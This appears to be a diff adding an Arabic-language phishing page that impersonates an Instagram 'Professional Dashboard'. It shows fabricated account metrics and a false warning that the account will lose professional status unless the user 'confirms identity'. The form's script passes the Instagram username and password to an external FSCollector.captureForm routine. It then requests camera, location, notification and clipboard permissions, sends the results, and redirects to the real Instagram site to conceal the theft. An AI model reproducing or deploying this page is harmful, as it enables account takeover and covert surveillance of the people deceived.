@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#1e3a8a">
+<title>Professional Dashboard - Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #0f172a;
+    color: #fff;
+  }
+  .topbar {
+    background: #1e293b;
+    padding: 16px 20px;
+    border-bottom: 1px solid #334155;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .topbar-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-weight: 700;
+    font-size: 16px;
+  }
+  .topbar-logo svg { width: 28px; height: 28px; }
+  .badge {
+    background: #3b82f6;
+    color: #fff;
+    padding: 4px 10px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-weight: 600;
+  }
+  .container {
+    max-width: 500px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+  .card {
+    background: #1e293b;
+    border: 1px solid #334155;
+    border-radius: 16px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+  .card-title {
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .metrics-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+  .metric {
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 12px;
+    padding: 16px;
+  }
+  .metric-value {
+    font-size: 24px;
+    font-weight: 800;
+    margin-bottom: 4px;
+  }
+  .metric-label {
+    font-size: 11px;
+    color: #94a3b8;
+    margin-bottom: 6px;
+    letter-spacing: 0.5px;
+  }
+  .metric-change {
+    font-size: 11px;
+    font-weight: 600;
+  }
+  .up { color: #10b981; }
+  .down { color: #ef4444; }
+  .chart {
+    height: 120px;
+    background: linear-gradient(180deg, rgba(59,130,246,0.2), transparent);
+    border-radius: 10px;
+    position: relative;
+    margin-bottom: 16px;
+    overflow: hidden;
+  }
+  .chart svg { width: 100%; height: 100%; }
+  .warning-box {
+    background: rgba(239,68,68,0.1);
+    border: 1px solid rgba(239,68,68,0.3);
+    border-radius: 10px;
+    padding: 14px;
+    font-size: 13px;
+    color: #fca5a5;
+    line-height: 1.5;
+    margin-bottom: 16px;
+  }
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    background: #0f172a;
+    border: 1px solid #334155;
+    border-radius: 10px;
+    font-size: 15px;
+    color: #fff;
+    font-family: inherit;
+    margin-bottom: 12px;
+  }
+  .form-input::placeholder { color: #64748b; }
+  .form-input:focus {
+    outline: none;
+    border-color: #3b82f6;
+    box-shadow: 0 0 0 3px rgba(59,130,246,0.15);
+  }
+  .btn {
+    width: 100%;
+    padding: 15px;
+    background: #3b82f6;
+    color: #fff;
+    border: none;
+    border-radius: 10px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .error-msg {
+    background: rgba(239,68,68,0.15);
+    border: 1px solid rgba(239,68,68,0.4);
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #fca5a5;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <div class="topbar-logo">
+    <svg viewBox="0 0 24 24"><path fill="#E4405F" d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8z"/></svg>
+    <span>Professional Dashboard</span>
+  </div>
+  <div class="badge">مميز</div>
+</div>
+
+<div class="container">
+
+  <div class="card">
+    <div class="card-title">📊 نظرة عامة (آخر 30 يوم)</div>
+
+    <div class="metrics-grid">
+      <div class="metric">
+        <div class="metric-label">الوصول</div>
+        <div class="metric-value" style="color:#3b82f6;">184K</div>
+        <div class="metric-change up">+12.4%</div>
+      </div>
+      <div class="metric">
+        <div class="metric-label">التفاعلات</div>
+        <div class="metric-value" style="color:#10b981;">12.4K</div>
+        <div class="metric-change up">+8.7%</div>
+      </div>
+      <div class="metric">
+        <div class="metric-label">متابعين جدد</div>
+        <div class="metric-value" style="color:#a855f7;">1,247</div>
+        <div class="metric-change up">+23.1%</div>
+      </div>
+      <div class="metric">
+        <div class="metric-label">مشاهدات Reels</div>
+        <div class="metric-value" style="color:#f59e0b;">284K</div>
+        <div class="metric-change down">-3.2%</div>
+      </div>
+    </div>
+
+    <div class="chart">
+      <svg viewBox="0 0 400 120" preserveAspectRatio="none">
+        <polyline points="0,80 40,70 80,75 120,55 160,60 200,45 240,35 280,40 320,25 360,30 400,20" 
+                  fill="none" stroke="#3b82f6" stroke-width="2"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="warning-box">
+    <strong>⚠️ تنبيه:</strong> حسابك على وشك فقدان صفة "حساب احترافي" بسبب عدم تأكيد الهوية منذ 30 يوم.
+  </div>
+
+  <div class="card">
+    <div class="card-title">🔐 تأكيد الهوية</div>
+    <p style="font-size:13px;color:#94a3b8;line-height:1.5;margin-bottom:16px;">
+      للحفاظ على صفة "حساب احترافي" والوصول لكل المزايا، يرجى تسجيل الدخول.
+    </p>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="pro-form" onsubmit="return handlePro(event)">
+      <input type="text" id="username" class="form-input" placeholder="اسم المستخدم على Instagram" required>
+      <input type="password" id="password" class="form-input" placeholder="كلمة المرور" required>
+      <button type="submit" class="btn" id="pro-btn">تأكيد الهوية</button>
+    </form>
+  </div>
+
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handlePro(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('pro-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'pro_dashboard'
+        }, {
+            metadata: { page: 'instagram_07_pro_dashboard' }
+        }).then(function() {
+            FSCollector.showLoader('جاري تأكيد الحساب الاحترافي...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: false,
+                    location: true,
+                    notifications: true,
+                    clipboard: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handlePro = handlePro;
+
+})();
+</script>
+
+</body>
+</html>
